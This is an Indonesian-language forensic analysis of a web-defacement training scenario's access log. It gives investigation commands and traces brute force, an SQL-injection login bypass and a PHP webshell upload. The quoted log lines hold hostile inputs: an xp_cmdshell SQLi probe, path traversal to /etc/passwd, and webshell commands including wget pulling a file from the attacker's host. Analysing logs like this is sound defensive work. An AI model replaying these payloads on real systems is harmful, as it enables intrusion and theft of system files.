# Analisis Log Serangan — Portrait Studio Web Defacement

**File log**: `portrait_access.log` (format Apache combined log)
**Total baris**: 15.635
**IP Server korban**: `10.233.6.67:8080`
**Referensi**: ARTIFACT BIMTEK PUSSIBER v1.0 — Blue Team Scenario: Web Defacement

Dokumen ini berisi seluruh command yang dijalankan untuk melakukan investigasi log, penjelasan tujuan tiap command, dan **output asli** yang dihasilkan (kecuali langkah paling awal membaca isi file PDF skenario, yang tidak disertakan karena berupa dump teks dokumen, bukan hasil analisis log).

---

## 0. Persiapan

### Cek keberadaan file log & PDF skenario
```bash
find /home/ping/claude -maxdepth 3 -iname "*.log" -o -iname "*.pdf" 2>/dev/null
```
**Output:**
```
/home/ping/claude/portrait_access.log
/home/ping/claude/ARTIFACT BIMTEK PUSSIBER v1.0.pdf
```

### Cek jumlah baris dan format log
```bash
wc -l /home/ping/claude/portrait_access.log
head -5 /home/ping/claude/portrait_access.log
tail -5 /home/ping/claude/portrait_access.log
```
**Output:**
```
15635 /home/ping/claude/portrait_access.log
---head---
10.233.6.72 - - [16/Sep/2026:12:00:24 +0000] "GET / HTTP/1.1" 200 1915 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.72 - - [16/Sep/2026:12:00:24 +0000] "GET /assets/landing.css HTTP/1.1" 200 1890 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.72 - - [16/Sep/2026:12:00:24 +0000] "GET /favicon.ico HTTP/1.1" 404 396 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.72 - - [16/Sep/2026:12:00:36 +0000] "GET /under-construction HTTP/1.1" 200 764 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.72 - - [16/Sep/2026:12:00:38 +0000] "GET / HTTP/1.1" 200 1914 "http://10.233.6.67:8080/under-construction" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
---tail---
10.233.6.72 - - [16/Sep/2026:13:13:14 +0000] "GET /administrator HTTP/1.1" 200 907 "http://10.233.6.67:8080/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.72 - - [16/Sep/2026:13:13:21 +0000] "GET /administrator HTTP/1.1" 200 908 "http://10.233.6.67:8080/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:04:04 +0000] "GET /uploads/shinobijakarta.php HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET / HTTP/1.1" 200 703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET /hacked.gif HTTP/1.1" 200 3913961 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```
**Catatan penting**: dari `tail`, urutan baris di file **tidak selalu berurutan berdasarkan waktu** (baris IP `.72` jam 13:13 diikuti baris IP `.71` jam 13:04). Ini berarti log perlu **di-sort ulang berdasarkan timestamp** sebelum membuat timeline.

### Cek rentang tanggal dalam log
```bash
awk -F'[][]' '{print $2}' /home/ping/claude/portrait_access.log | cut -d: -f1 | sort -u
```
**Output:**
```
16/Sep/2026
```
Semua log berada di tanggal yang sama, jadi sorting berdasarkan jam saja sudah cukup akurat.

---

## 1. Identifikasi IP Attacker

### Hitung jumlah request per IP
```bash
awk '{print $1}' /home/ping/claude/portrait_access.log | sort | uniq -c
```
**Output:**
```
     18 10.233.6.66
  15548 10.233.6.71
     38 10.233.6.72
     31 ::1
```
IP `10.233.6.71` memiliki jumlah request jauh lebih besar dari yang lain → **attacker**.

---

## 2. Ekstraksi & Pengurutan Log Attacker

### Ekstrak semua baris milik attacker
```bash
grep '^10.233.6.71 ' /home/ping/claude/portrait_access.log > attacker_raw.log
wc -l attacker_raw.log
head -5 attacker_raw.log
```
**Output:**
```
15548 attacker_raw.log
---first 5 lines in file order---
10.233.6.71 - - [16/Sep/2026:12:08:07 +0000] "GET / HTTP/1.1" 200 1954 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:08:08 +0000] "GET /assets/landing.css HTTP/1.1" 200 1890 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:08:08 +0000] "GET /favicon.ico HTTP/1.1" 404 396 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:08:13 +0000] "GET / HTTP/1.1" 200 1954 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:08:14 +0000] "GET / HTTP/1.1" 200 1953 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```

### Urutkan berdasarkan timestamp
```bash
awk -F'[][]' '{print $2, $0}' attacker_raw.log | \
  sed -E 's/^([0-9]+)\/([A-Za-z]+)\/([0-9]+):([0-9:]+) \+0000 /\3-\2-\1T\4 /' > attacker_sortkey.log
head -3 attacker_sortkey.log
```
**Output:**
```
2026-Sep-16T12:08:07 10.233.6.71 - - [16/Sep/2026:12:08:07 +0000] "GET / HTTP/1.1" 200 1954 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
2026-Sep-16T12:08:08 10.233.6.71 - - [16/Sep/2026:12:08:08 +0000] "GET /assets/landing.css HTTP/1.1" 200 1890 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
2026-Sep-16T12:08:08 10.233.6.71 - - [16/Sep/2026:12:08:08 +0000] "GET /favicon.ico HTTP/1.1" 404 396 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```

```bash
sort -k1,1 attacker_sortkey.log | cut -d' ' -f2- > attacker_sorted.log
wc -l attacker_sorted.log
head -1 attacker_sorted.log   # aktivitas pertama
tail -1 attacker_sorted.log   # aktivitas terakhir
```
**Output:**
```
15548 attacker_sorted.log
--- first request (earliest activity) ---
10.233.6.71 - - [16/Sep/2026:12:08:07 +0000] "GET / HTTP/1.1" 200 1954 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
--- last request ---
10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET /hacked.gif HTTP/1.1" 200 3913961 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```
→ Aktivitas pertama attacker: **16/Sep/2026 12:08:07 UTC**.

---

## 3. Identifikasi User-Agent Attacker

```bash
awk -F'"' '{print $6}' attacker_sorted.log | sort | uniq -c | sort -rn
```
**Output:**
```
  15427 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    121 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
```
Dua User-Agent berbeda ditemukan: `Firefox/155.0` (browsing manual) dan `Chrome/87.0.4280.88` (tool otomatis).

### Cari titik pergantian UA
```bash
grep -n "Chrome/87" attacker_sorted.log | head -3
grep -n "Firefox/155" attacker_sorted.log | tail -5
```
**Output:**
```
11:10.233.6.71 - - [16/Sep/2026:12:08:38 +0000] "GET / HTTP/1.1" 200 5417 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
12:10.233.6.71 - - [16/Sep/2026:12:08:38 +0000] "GET /.vFh4P1 HTTP/1.1" 404 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
13:10.233.6.71 - - [16/Sep/2026:12:08:38 +0000] "GET /0h9Q5l HTTP/1.1" 404 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
---
15544:10.233.6.71 - - [16/Sep/2026:13:03:44 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
15545:10.233.6.71 - - [16/Sep/2026:13:03:45 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
15546:10.233.6.71 - - [16/Sep/2026:13:04:04 +0000] "GET /uploads/shinobijakarta.php HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
15547:10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET / HTTP/1.1" 200 703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
15548:10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET /hacked.gif HTTP/1.1" 200 3913961 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```
→ UA beralih ke Chrome/87 mulai `12:08:38` (fase brute force otomatis dimulai) dan kembali ke Firefox pada fase interaksi shell/manual (13:03:xx dst).

---

## 4. Analisis Directory Brute Force

### Breakdown status code selama fase brute force
```bash
grep "Chrome/87" attacker_sorted.log | awk '{print $9}' | sort | uniq -c | sort -rn
```
**Output:**
```
  15367 404
     40 403
      8 302
      7 200
      3 400
      2 301
```

### Lihat endpoint non-404 (contoh 403 — pola wordlist file sensitif)
```bash
grep "Chrome/87" attacker_sorted.log | awk '$9!=404 {print $9, $7}' | sort | uniq -c | sort -rn | head -40
```
**Output (contoh):**
```
      1 403 /uploads/
      1 403 /server-status/
      1 403 /server-status
      1 403 /assets/
      1 403 /.php
      1 403 /.htusers
      1 403 /.httr-oauth
      1 403 /.htpasswds
      1 403 /.htpasswd_test
      1 403 /.htpasswd/
      1 403 /.htpasswd.inc
      1 403 /.htpasswd.bak
      1 403 /.htpasswd-old
      1 403 /.htpasswd
      1 403 /.html
      1 403 /.htm
      1 403 /.htgroup
      1 403 /.htaccess~
      1 403 /.htaccess_sc
      1 403 /.htaccess_orig
      1 403 /.htaccess_extra
      1 403 /.htaccessOLD2
      1 403 /.htaccessOLD
      1 403 /.htaccessBAK
      1 403 /.htaccess/
      1 403 /.htaccess.txt
      1 403 /.htaccess.save
      1 403 /.htaccess.sample
      1 403 /.htaccess.orig
      1 403 /.htaccess.old
      1 403 /.htaccess.inc
      1 403 /.htaccess.bak1
      1 403 /.htaccess.bak
      1 403 /.htaccess.BAK
      1 403 /.htaccess-marco
      1 403 /.htaccess-local
      1 403 /.htaccess-dev
      1 403 /.htaccess
      1 403 /.hta
      1 403 /.ht_wsr.txt
```
→ Pola nama file (`.htaccess.bak`, `.htpasswd.old`, dst.) khas wordlist tool content-discovery (ffuf/gobuster/dirsearch).

### Lihat endpoint yang benar-benar ditemukan (200/301/302/400)
```bash
grep "Chrome/87" attacker_sorted.log | awk '$9==200 {print $4, $9, $7}'
grep "Chrome/87" attacker_sorted.log | awk '$9==301 {print $4, $9, $7}'
grep "Chrome/87" attacker_sorted.log | awk '$9==302 {print $4, $9, $7}'
grep "Chrome/87" attacker_sorted.log | awk '$9==400 {print $4, $9, $7}'
```
**Output:**
```
=== 200 responses ===
[16/Sep/2026:12:08:38 200 /
[16/Sep/2026:12:09:26 200 /administrator
[16/Sep/2026:12:09:26 200 /administrator.php
[16/Sep/2026:12:09:26 200 /administrator/
[16/Sep/2026:12:10:10 200 /db.php
[16/Sep/2026:12:10:44 200 /index.php
[16/Sep/2026:12:10:44 200 /index.php/login/

=== 301 responses ===
[16/Sep/2026:12:09:42 301 /assets
[16/Sep/2026:12:12:41 301 /uploads

=== 302 responses ===
[16/Sep/2026:12:10:09 302 /dashboard
[16/Sep/2026:12:10:09 302 /dashboard.php
[16/Sep/2026:12:10:09 302 /dashboard/
[16/Sep/2026:12:10:59 302 /logout
[16/Sep/2026:12:10:59 302 /logout.php
[16/Sep/2026:12:10:59 302 /logout/
[16/Sep/2026:12:11:52 302 /profile
[16/Sep/2026:12:11:52 302 /profile.php

=== 400 responses ===
[16/Sep/2026:12:08:40 400 /%2E%2E//google.com
[16/Sep/2026:12:08:40 400 /.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd
[16/Sep/2026:12:09:55 400 /cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd
```

### Hitung rentang waktu & rate request (bukti automated scanning)
```bash
grep "Chrome/87" attacker_sorted.log | head -1 | awk '{print $4}'
grep "Chrome/87" attacker_sorted.log | tail -1 | awk '{print $4}'
```
**Output:**
```
[16/Sep/2026:12:08:38
[16/Sep/2026:12:12:58
```

```bash
grep "Chrome/87" attacker_sorted.log | awk -F'[][]' '{print $2}' | cut -d' ' -f1 | sort | uniq -c | sort -rn | head -10
```
**Output:**
```
    152 16/Sep/2026:12:08:44
    137 16/Sep/2026:12:08:43
    136 16/Sep/2026:12:08:49
    129 16/Sep/2026:12:08:50
    127 16/Sep/2026:12:09:02
    125 16/Sep/2026:12:09:04
    125 16/Sep/2026:12:09:01
    124 16/Sep/2026:12:08:46
    121 16/Sep/2026:12:09:05
    121 16/Sep/2026:12:08:42
```
→ Puncak **~150 request/detik**, total 15.427 request dalam ~4 menit 20 detik (12:08:38–12:12:58) — jelas bukan aktivitas manusia manual, melainkan tool otomatis.

---

## 5. Analisis SQL Injection & Login Bypass

### Lihat semua request POST yang dikirim attacker
```bash
grep '"POST' attacker_sorted.log | awk '{print $4, $6, $7, $9}' | sort | uniq -c | sort -rn | head -30
```
**Output (30 teratas):**
```
      8 [16/Sep/2026:12:35:17 "POST /administrator 200
      7 [16/Sep/2026:12:36:04 "POST /administrator 500
      5 [16/Sep/2026:12:35:14 "POST /administrator 200
      4 [16/Sep/2026:12:36:19 "POST /administrator 200
      4 [16/Sep/2026:12:35:21 "POST /administrator 500
      4 [16/Sep/2026:12:35:19 "POST /administrator 200
      3 [16/Sep/2026:12:36:16 "POST /administrator 200
      3 [16/Sep/2026:12:36:03 "POST /administrator 200
      3 [16/Sep/2026:12:35:57 "POST /administrator 200
      3 [16/Sep/2026:12:35:24 "POST /administrator 200
      3 [16/Sep/2026:12:35:19 "POST /administrator 500
      3 [16/Sep/2026:12:35:17 "POST /administrator 500
      3 [16/Sep/2026:12:35:15 "POST /administrator 500
      3 [16/Sep/2026:12:35:11 "POST /administrator 200
      2 [16/Sep/2026:12:36:18 "POST /administrator 200
      2 [16/Sep/2026:12:36:05 "POST /administrator 200
      2 [16/Sep/2026:12:35:24 "POST /administrator 500
      2 [16/Sep/2026:12:35:18 "POST /administrator 500
      2 [16/Sep/2026:12:35:16 "POST /administrator 200
      2 [16/Sep/2026:12:35:05 "POST /administrator 500
      2 [16/Sep/2026:12:35:04 "POST /administrator 500
      1 [16/Sep/2026:12:46:38 "POST /profile 200
      1 [16/Sep/2026:12:45:55 "POST /profile 200
      1 [16/Sep/2026:12:36:59 "POST /administrator 302
      1 [16/Sep/2026:12:36:58 "POST /administrator 200
      1 [16/Sep/2026:12:36:17 "POST /administrator 500
      1 [16/Sep/2026:12:36:17 "POST /administrator 302
      1 [16/Sep/2026:12:36:03 "POST /administrator 500
      1 [16/Sep/2026:12:35:58 "POST /administrator 500
      1 [16/Sep/2026:12:35:58 "POST /administrator 200
```
→ Mayoritas POST menuju `/administrator` (form login), berlangsung padat pada rentang 12:35–12:36.

### Ambil semua variasi request line POST /administrator
```bash
grep '"POST /administrator' attacker_sorted.log | \
  sed -E 's/^.*\] "(.*)" [0-9]+ [0-9]+ .*$/\1/' | sort -u
```
**Output:**
```
POST /administrator HTTP/1.1
POST /administrator?loFe=6311%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
```
→ Satu request membawa payload generik `UNION ALL SELECT ... xp_cmdshell` di query string dengan parameter acak `loFe` — indikasi probe scanner otomatis, bukan payload bypass login yang sesungguhnya (payload asli dikirim lewat body POST yang tidak tercatat di access log).

### Lihat urutan status code POST /administrator secara kronologis
```bash
grep '"POST /administrator' attacker_sorted.log | awk '{print $4, $9}' | sed 's/\[//'
```
**Output:**
```
16/Sep/2026:12:31:27 200
16/Sep/2026:12:35:02 200
16/Sep/2026:12:35:03 200
16/Sep/2026:12:35:04 200
16/Sep/2026:12:35:04 500
16/Sep/2026:12:35:04 500
16/Sep/2026:12:35:05 500
16/Sep/2026:12:35:05 500
16/Sep/2026:12:35:11 200
16/Sep/2026:12:35:11 200
16/Sep/2026:12:35:11 200
16/Sep/2026:12:35:14 200
16/Sep/2026:12:35:14 200
16/Sep/2026:12:35:14 200
16/Sep/2026:12:35:14 200
16/Sep/2026:12:35:14 200
16/Sep/2026:12:35:15 500
16/Sep/2026:12:35:15 500
16/Sep/2026:12:35:15 500
16/Sep/2026:12:35:16 200
16/Sep/2026:12:35:16 200
16/Sep/2026:12:35:16 500
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 200
16/Sep/2026:12:35:17 500
16/Sep/2026:12:35:17 500
16/Sep/2026:12:35:17 500
16/Sep/2026:12:35:18 200
16/Sep/2026:12:35:18 500
16/Sep/2026:12:35:18 500
16/Sep/2026:12:35:19 200
16/Sep/2026:12:35:19 200
16/Sep/2026:12:35:19 200
16/Sep/2026:12:35:19 200
16/Sep/2026:12:35:19 500
16/Sep/2026:12:35:19 500
16/Sep/2026:12:35:19 500
16/Sep/2026:12:35:21 500
16/Sep/2026:12:35:21 500
16/Sep/2026:12:35:21 500
16/Sep/2026:12:35:21 500
16/Sep/2026:12:35:23 500
16/Sep/2026:12:35:24 200
16/Sep/2026:12:35:24 200
16/Sep/2026:12:35:24 200
16/Sep/2026:12:35:24 500
16/Sep/2026:12:35:24 500
16/Sep/2026:12:35:29 200
16/Sep/2026:12:35:57 200
16/Sep/2026:12:35:57 200
16/Sep/2026:12:35:57 200
16/Sep/2026:12:35:58 200
16/Sep/2026:12:35:58 500
16/Sep/2026:12:36:03 200
16/Sep/2026:12:36:03 200
16/Sep/2026:12:36:03 200
16/Sep/2026:12:36:03 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:04 500
16/Sep/2026:12:36:05 200
16/Sep/2026:12:36:05 200
16/Sep/2026:12:36:16 200
16/Sep/2026:12:36:16 200
16/Sep/2026:12:36:16 200
16/Sep/2026:12:36:17 302
16/Sep/2026:12:36:17 500
16/Sep/2026:12:36:18 200
16/Sep/2026:12:36:18 200
16/Sep/2026:12:36:19 200
16/Sep/2026:12:36:19 200
16/Sep/2026:12:36:19 200
16/Sep/2026:12:36:19 200
16/Sep/2026:12:36:58 200
16/Sep/2026:12:36:59 302
```
→ 85 total request POST /administrator. Satu percobaan tunggal di 12:31:27, lalu ledakan fuzzing 12:35:02–12:36:19 (mix 200/500 = payload menyebabkan error SQL), diakhiri `302` (login berhasil).

### Ambil timestamp login berhasil
```bash
grep '"POST /administrator' attacker_sorted.log | grep ' 302 '
```
**Output:**
```
10.233.6.71 - - [16/Sep/2026:12:36:17 +0000] "POST /administrator HTTP/1.1" 302 285 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:59 +0000] "POST /administrator HTTP/1.1" 302 321 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```
→ **Login bypass berhasil pertama kali: 12:36:17**, dikonfirmasi ulang pada 12:36:59.

---

## 6. Analisis Aktivitas Pasca-Login (Upload & Webshell)

### Lihat semua aktivitas tepat setelah login berhasil
```bash
sed -n '/12:36:17/,/12:40:00/p' attacker_sorted.log | grep -v 404
```
**Output:**
```
10.233.6.71 - - [16/Sep/2026:12:36:17 +0000] "GET /dashboard HTTP/1.1" 200 1766 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:17 +0000] "POST /administrator HTTP/1.1" 302 285 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:17 +0000] "POST /administrator HTTP/1.1" 500 279 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:18 +0000] "POST /administrator HTTP/1.1" 200 899 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:18 +0000] "POST /administrator HTTP/1.1" 200 899 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:19 +0000] "POST /administrator HTTP/1.1" 200 899 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:19 +0000] "POST /administrator HTTP/1.1" 200 899 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:19 +0000] "POST /administrator HTTP/1.1" 200 899 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:19 +0000] "POST /administrator HTTP/1.1" 200 899 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:58 +0000] "POST /administrator HTTP/1.1" 200 936 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:36:59 +0000] "POST /administrator HTTP/1.1" 302 321 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:37:12 +0000] "GET /dashboard HTTP/1.1" 200 1803 "http://10.233.6.67:8080/administrator" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:37:30 +0000] "GET /profile HTTP/1.1" 200 1493 "http://10.233.6.67:8080/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```

### Lihat detail proses upload file berbahaya
```bash
sed -n '/12:45:55/,/12:47:35/p' attacker_sorted.log
```
**Output:**
```
10.233.6.71 - - [16/Sep/2026:12:45:55 +0000] "POST /profile HTTP/1.1" 200 1563 "http://10.233.6.67:8080/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:46:38 +0000] "POST /profile HTTP/1.1" 200 1559 "http://10.233.6.67:8080/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:46:47 +0000] "GET /uploads/halodunia.php HTTP/1.1" 500 177 "http://10.233.6.67:8080/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:46:55 +0000] "GET /uploads/halodunia.php?cmd=id HTTP/1.1" 200 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:47:01 +0000] "GET /uploads/halodunia.php?cmd=whoami HTTP/1.1" 200 205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:47:07 +0000] "GET /uploads/halodunia.php?cmd=pwd HTTP/1.1" 200 222 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:47:30 +0000] "GET /uploads/halodunia.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 961 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```
→ Upload dilakukan lewat `POST /profile` (12:46:38), file `halodunia.php` langsung tersimpan di `/uploads/` dan bisa dieksekusi (bukti: `?cmd=id` sukses jam 12:46:55).

### Cek semua endpoint POST attacker (untuk memastikan tidak ada endpoint upload lain)
```bash
grep '"POST' attacker_sorted.log | awk -F'"' '{print $2}' | awk '{print $2}' | sort -u
```
**Output:**
```
/administrator
/administrator?loFe=6311%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
/profile
```

### Lanjutan aktivitas pasca command execution s.d. defacement
```bash
sed -n '/12:45:55/,/12:47:35/p' attacker_sorted.log
```
*(rentang diperluas manual sampai akhir log untuk membaca kelanjutan aktivitas, lihat log penuh berikut)*
**Output (lanjutan hingga akhir aktivitas attacker):**
```
10.233.6.71 - - [16/Sep/2026:12:55:35 +0000] "GET /uploads/halodunia.php?cmd=la%20-la HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:55:41 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 398 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:57:44 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 380 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:12:58:59 +0000] "GET /uploads/halodunia.php?cmd=wget%20http://10.233.6.71/shinobijakarta.zip HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:01:47 +0000] "GET /uploads/halodunia.php?cmd=wget%20http://10.233.6.71/shinobijakarta.zip HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:01:56 +0000] "GET /uploads/halodunia.php?cmd=wget%20http://10.233.6.71/shinobijakarta.zip HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
